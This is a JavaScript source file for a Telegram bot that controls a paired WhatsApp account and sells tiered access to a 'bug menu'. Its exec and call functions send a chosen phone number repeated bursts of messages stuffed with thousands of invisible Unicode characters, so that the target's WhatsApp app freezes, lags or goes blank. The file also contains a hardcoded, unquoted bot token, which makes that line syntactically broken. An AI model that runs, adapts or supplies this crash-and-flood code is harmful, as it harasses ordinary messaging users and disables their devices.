// 1. IMPOR LIBRARY (SEMUA LENGKAP)
const { Telegraf, Markup } = require('telegraf');
const {
    makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    generateWAMessageFromContent
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const { BOT_TOKEN, OWNER_ID, DEV_USERNAME } = require('./config');
const readline = require('readline');
const chalk = require('chalk');
const fs = require('fs');
const { Low } = require('lowdb');
const { JSONFile } = require('lowdb/node');
const qrcode = require('qrcode-terminal');
const axios = require('axios');

const GITHUB_TOKEN_LIST_URL = ""; // URL daftar token dari GitHub

// 2. VARIABEL GLOBAL
let Seren = null;
let isWhatsAppConnected = false;
let currentCtx = null;
const startTime = Date.now();
const videoUrls = [
    // Isi dengan URL video kamu
];
const audioIntroUrl = ""; // Isi dengan URL audio intro
const langgxyz = "id"; // Bahasa

// 3. INISIALISASI DATABASE
const dbFile = './database.json';
const adapter = new JSONFile(dbFile);
const db = new Low(adapter);

async function initDb() {
    try {
        await db.read();
        db.data = db.data || {
            premium: [],
            admin: [OWNER_ID], // Owner otomatis jadi admin
            owner: [OWNER_ID], // Tambah array owner
            blacklist: []
        };
        await db.write();
        console.log(chalk.green(`✅ Database siap`));
    } catch (error) {
        console.error(chalk.red(`❌ Error DB: ${error.message}`));
        process.exit(1);
    }
}
initDb();

// 4. FUNGSI PENDUKUNG
const getUptime = () => {
    const durationMs = Date.now() - startTime;
    const jam = Math.floor(durationMs / 3600000);
    const menit = Math.floor((durationMs % 3600000) / 60000);
    const detik = Math.floor((durationMs % 60000) / 1000);
    return `${jam}j ${menit}m ${detik}d`;
};

const isBlacklisted = (ctx) => ctx?.from && db.data.blacklist.includes(ctx.from.id.toString());
const isAdmin = (ctx) => ctx?.from && db.data.admin.includes(ctx.from.id.toString());
const isOwner = (ctx) => ctx?.from && db.data.owner.includes(ctx.from.id.toString()); // Cek owner

const getRandomVideo = () => videoUrls[Math.floor(Math.random() * videoUrls.length)];

const loadVideoToCache = async (url) => {
    try {
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        return Buffer.from(response.data, 'binary');
    } catch (error) {
        console.error(chalk.red(`❌ Gagal load video: ${error.message}`));
        return null;
    }
};

const formatWaJid = (number) => {
    if (!number) return null;
    let jid = number.replace(/[^0-9]/g, '');
    return jid.startsWith('0') ? `62${jid.slice(1)}@s.whatsapp.net` : `${jid}@s.whatsapp.net`;
};

const formatTeleId = (id) => id.toString(); // Format ID Telegram jadi string

// 5. FUNGSI SLEEP YANG DIINGINKAN
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// 6. FUNGSI BACA INPUT TERMINAL
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});
const question = (text) => new Promise((resolve) => rl.question(text, resolve));

// ==============================================
// 7. FUNGSI BUG -> BAGIAN EKSEKUSI (ASLI NGIRIM BUG)
// ==============================================
async function execIosInvis(sock, target) {
    console.log(chalk.cyan(`🔫 Eksekusi iOS Invisible ke ${target}`));
    const invisMessage = generateWAMessageFromContent(target, {
        extendedTextMessage: {
            text: "\u200E", // Karakter tak terlihat
            title: "\u200E".repeat(1500),
            description: "\u200E".repeat(2500),
            previewType: "NONE",
            jpegThumbnail: Buffer.from(""),
        }
    }, {});
    await sock.relayMessage(target, invisMessage.message, { messageId: invisMessage.key.id });
    return Promise.resolve();
}

async function execXBlank(sock, target) {
    console.log(chalk.cyan(`🔫 Eksekusi XBlank ke ${target}`));
    const blankMessage = generateWAMessageFromContent(target, {
        extendedTextMessage: {
            text: "\u200E",
            title: "\u200E".repeat(2000),
            description: "\u200E".repeat(3000),
            previewType: "NONE",
            jpegThumbnail: Buffer.from(""),
        }
    }, {});
    await sock.relayMessage(target, blankMessage.message, { messageId: blankMessage.key.id });
    return Promise.resolve();
}

async function execDelayInvis(sock, target) {
    console.log(chalk.cyan(`🔫 Eksekusi DelayInvis ke ${target}`));
    const delayInvisMessage = generateWAMessageFromContent(target, {
        extendedTextMessage: {
            text: "\u200E",
            title: "\u200E".repeat(1200),
            description: "\u200E".repeat(1800),
            previewType: "NONE",
            jpegThumbnail: Buffer.from(""),
        }
    }, {});
    await sock.relayMessage(target, delayInvisMessage.message, { messageId: delayInvisMessage.key.id });
    return Promise.resolve();
}

async function execXDelay(sock, target) {
    console.log(chalk.cyan(`🔫 Eksekusi XDelay ke ${target}`));
    const xdelayMessage = generateWAMessageFromContent(target, {
        extendedTextMessage: {
            text: "\u200E",
            title: "\u200E".repeat(1000),
            description: "\u200E".repeat(1500),
            previewType: "NONE",
            jpegThumbnail: Buffer.from(""),
        }
    }, {});
    await sock.relayMessage(target, xdelayMessage.message, { messageId: xdelayMessage.key.id });
    return Promise.resolve();
}

// ==============================================
// 8. FUNGSI BUG -> BAGIAN PEMANGGIL (NGATUR LOOP & URUTAN)
// ==============================================
async function callInvisibleV2(sock, target) {
    console.log(chalk.magenta(`🚀 Memanggil serangan InvisibleV2 ke ${target}`));
    for (let i = 0; i < 30; i++) {
        await execIosInvis(sock, target);
        await sleep(200);
    }
    console.log(chalk.green(`✅ Serangan InvisibleV2 selesai ke ${target}`));
    return "selesai";
}

async function callXBlank(sock, target) {
    console.log(chalk.magenta(`🚀 Memanggil serangan XBlank ke ${target}`));
    for (let i = 0; i < 35; i++) {
        await execXBlank(sock, target);
        await sleep(150);
    }
    console.log(chalk.green(`✅ Serangan XBlank selesai`));
    return "selesai";
}

async function callDelayInvis(sock, target) {
    console.log(chalk.magenta(`🚀 Memanggil serangan DelayInvis ke ${target}`));
    for (let i = 0; i < 28; i++) {
        await execDelayInvis(sock, target);
        await sleep(180);
    }
    console.log(chalk.green(`✅ Serangan DelayInvis selesai`));
    return "selesai";
}

async function callXDelay(sock, target) {
    console.log(chalk.magenta(`🚀 Memanggil serangan XDelay ke ${target}`));
    for (let i = 0; i < 25; i++) {
        await execXDelay(sock, target);
        await sleep(200);
    }
    console.log(chalk.green(`✅ Serangan XDelay selesai`));
    return "selesai";
}

// ==============================================
// 9. FUNGSI ADD (ADDPREMIUM, ADDADMIN, ADDOWNER)
// ==============================================
async function addPremium(userId) {
    const idStr = formatTeleId(userId);
    if (db.data.premium.includes(idStr)) return "❌ Sudah jadi premium";
    db.data.premium.push(idStr);
    await db.write();
    return `✅ Berhasil tambah premium: ${userId}`;
}

async function addAdmin(userId) {
    const idStr = formatTeleId(userId);
    if (db.data.admin.includes(idStr)) return "❌ Sudah jadi admin";
    db.data.admin.push(idStr);
    await db.write();
    return `✅ Berhasil tambah admin: ${userId}`;
}

async function addOwner(userId) {
    const idStr = formatTeleId(userId);
    if (db.data.owner.includes(idStr)) return "❌ Sudah jadi owner";
    db.data.owner.push(idStr);
    await db.write();
    return `✅ Berhasil tambah owner: ${userId}`;
}

// 9.1 FUNGSI ADD PAIRING
async function addPairing(ctx) {
    try {
        const nomor = await question("Masukkan nomor WA (628xxx): ");
        await Seren.requestPairingCode(nomor);
        const kode = await question("Masukkan kode pairing: ");
        await Seren.submitPairingCode(kode);
        return "✅ Berhasil pairing!";
    } catch (error) {
        console.error(chalk.red(`❌ Gagal pairing: ${error.message}`));
        return "❌ Gagal pairing!";
    }
}

// 10. FUNGSI KONEKSI WHATSAPP
const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    Seren = makeWASocket({
        version,
        printQRInTerminal: false,
        pairingCode: true,
        logger: pino({ level: 'silent' }),
        auth: state,
        browser: ['Chrome (Linux)', '100.0', '']
    });

    Seren.ev.on('creds.update', saveCreds);
    Seren.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, isNewLogin, qr } = update;

        if (isNewLogin) {
            const nomor = await question("Masukkan nomor WA (628xxx): ");
            await Seren.requestPairingCode(nomor);
            const kode = await question("Masukkan kode pairing: ");
            await Seren.submitPairingCode(kode);
        }

        if (qr) {
            console.log(chalk.yellow(`🔴 Scan QR WA:`));
            qrcode.generate(qr, { small: true });
            if (currentCtx) currentCtx.reply("🔴 Scan QR di terminal!");
        }

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.green(`✅ WA terhubung!`));
            if (currentCtx) currentCtx.reply("✅ WA terhubung — siap jalankan bug!");
        }

        if (connection === 'close') {
            const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(chalk.red(`❌ WA terputus!`), reconnect ? 'Menghubungkan ulang...' : '');
            if (reconnect) startSesi();
            isWhatsAppConnected = false;
        }
    });
};
startSesi(); // JALANKAN KONEKSI WA

// 11. SETUP BOT TELEGRAM -> BUG MENU
const bot = new Telegraf(7738225453:AAHGTtHlmOde4WFBZgVBRwNZSOZb7GJ80X4);

// Middleware
const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) return ctx.reply("❌ WA belum terhubung.");
    return next();
};

const checkPremium = (ctx, next) => {
    if (!db.data.premium.includes(formatTeleId(ctx.from.id))) return ctx.reply("❌ Khusus Premium.");
    return next();
};

const checkAdmin = (ctx, next) => {
    if (!isAdmin(ctx)) return ctx.reply("❌ Khusus Admin.");
    return next();
};

const checkOwner = (ctx, next) => {
    if (!isOwner(ctx)) return ctx.reply("❌ Khusus Owner.");
    return next();
};

// State untuk target bug & add
bot.use((ctx, next) => {
    ctx.session = ctx.session || {};
    return next();
});

// ------------------------------
// COMMAND /start & /bugmenu -> LANGSUNG TAMPIL BUG MENU + FITUR ADD
// ------------------------------
bot.command(['start', 'bugmenu'], async (ctx) => {
    currentCtx = ctx;
    if (isBlacklisted(ctx)) return ctx.reply("⛔ Blacklisted.");

    const videoBuffer = await loadVideoToCache(getRandomVideo()) || null;
    const caption = `<blockquote>··:¨─══-‘๑’-══─¨ [ 💥 ] ¨─══-‘๑’-══─¨:·.
┏━━⋟<b>𝐌𝐄𝐍𝐔 𝐁𝐔𝐆 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏</b>
┃⚔️ /invisiblev2 [62xxx] - Serangan Invisible (Medium)
┃⚔️ /xdelay [62xxx] - Serangan Delay Ringan (Medium)
┃⚔️ /delayinvis [62xxx] - Serangan Delay Sedang (Medium)
┃🔥 /xblank [62xxx] - Serangan Blank Berat (Hard)
╰══━━━━━━━━━━━━❍
┏━━⋟<b>𝐌𝐄𝐍𝐔 𝐀𝐃𝐃</b>
┃🔑 /addprem [ID Telegram] - Tambah Premium (Admin+)
┃🔑 /addadmin [ID Telegram] - Tambah Admin (Owner+)
┃🔑 /addowner [ID Telegram] - Tambah Owner (Hanya Owner Awal)
┃🔑 /addpairing - Pairing WA (Semua)
╰══━━━━━━━━━━━━❍
<b>Klik tombol di bawah untuk jalankan bug langsung!</b></blockquote>`;

    // Tombol hanya untuk bug (fitur add pake command langsung)
    const keyboard = {
        inline_keyboard: [
            [{ text: "👻 InvisibleV2", callback_data: "run_invisiblev2" }],
            [{ text: "⏳ XDelay", callback_data: "run_xdelay" }],
            [{ text: "⌛ DelayInvis", callback_data: "run_delayinvis" }],
            [{ text: "⚡ XBlank", callback_data: "run_xblank" }],
            [{ text: "👑 Developer", url: `https://t.me/${DEV_USERNAME}` }]
        ]
    };

    if (videoBuffer) {
        await ctx.replyWithVideo({ source: videoBuffer }, { caption, parse_mode: "HTML", reply_markup: keyboard });
    } else {
        await ctx.reply(caption, { parse_mode: "HTML", reply_markup: keyboard });
    }

    // Kirim audio intro kalo ada
    if (audioIntroUrl) {
        await ctx.replyWithAudio(audioIntroUrl, {
            caption: "🎧 <b>Opening — ATOMIC</b>", parse_mode: "HTML",
            title: "Atomic Intro", performer: "SabanElite"
        });
    }
});

// ------------------------------
// HANDLER COMMAND ADD (ADDPREMIUM, ADDADMIN, ADDOWNER)
// ------------------------------
bot.command('addprem', checkAdmin, async (ctx) => {
    const userId = ctx.message.text.split(' ')[1];
    if (!userId || isNaN(userId)) return ctx.reply("❌ Gunakan: /addprem [ID Telegram]");
    const result = await addPremium(userId);
    ctx.reply(result);
});

bot.command('addadmin', checkOwner, async (ctx) => {
    const userId = ctx.message.text.split(' ')[1];
    if (!userId || isNaN(userId)) return ctx.reply("❌ Gunakan: /addadmin [ID Telegram]");
    const result = await addAdmin(userId);
    ctx.reply(result);
});

bot.command('addowner', checkOwner, async (ctx) => {
    const userId = ctx.message.text.split(' ')[1];
    if (!userId || isNaN(userId)) return ctx.reply("❌ Gunakan: /addowner [ID Telegram]");
    const result = await addOwner(userId);
    ctx.reply(result);
});

// ------------------------------
// HANDLER COMMAND ADDPairing
// ------------------------------
bot.command('addpairing', async (ctx) => {
    const result = await addPairing(ctx);
    ctx.reply(result);
});

// ------------------------------
// HANDLER CALLBACK QUERY (TOMBOL BUG)
// ------------------------------
bot.action('run_invisiblev2', checkWhatsAppConnection, checkPremium, async (ctx) => {
    ctx.reply("Masukkan nomor WA target (628xxx):")
        .then(() => ctx.session.type = 'invisiblev2')
        .catch(console.error);
});

bot.action('run_xdelay', checkWhatsAppConnection, checkPremium, async (ctx) => {
    ctx.reply("Masukkan nomor WA target (628xxx):")
        .then(() => ctx.session.type = 'xdelay')
        .catch(console.error);
});

bot.action('run_delayinvis', checkWhatsAppConnection, checkPremium, async (ctx) => {
    ctx.reply("Masukkan nomor WA target (628xxx):")
        .then(() => ctx.session.type = 'delayinvis')
        .catch(console.error);
});

bot.action('run_xblank', checkWhatsAppConnection, checkPremium, async (ctx) => {
    ctx.reply("Masukkan nomor WA target (628xxx):")
        .then(() => ctx.session.type = 'xblank')
        .catch(console.error);
});

bot.on('text', checkWhatsAppConnection, checkPremium, async (ctx) => {
    const nomorTarget = formatWaJid(ctx.message.text);
    if (!nomorTarget) return ctx.reply("❌ Nomor WA tidak valid.");
    if (!ctx.session.type) return;

    let result;
    switch (ctx.session.type) {
        case 'invisiblev2':
            result = await callInvisibleV2(Seren, nomorTarget);
            break;
        case 'xdelay':
            result = await callXDelay(Seren, nomorTarget);
            break;
        case 'delayinvis':
            result = await callDelayInvis(Seren, nomorTarget);
            break;
        case 'xblank':
            result = await callXBlank(Seren, nomorTarget);
            break;
        default:
            return;
    }

    delete ctx.session.type;
    ctx.reply(result || "✅ Selesai.");
});

bot.launch();

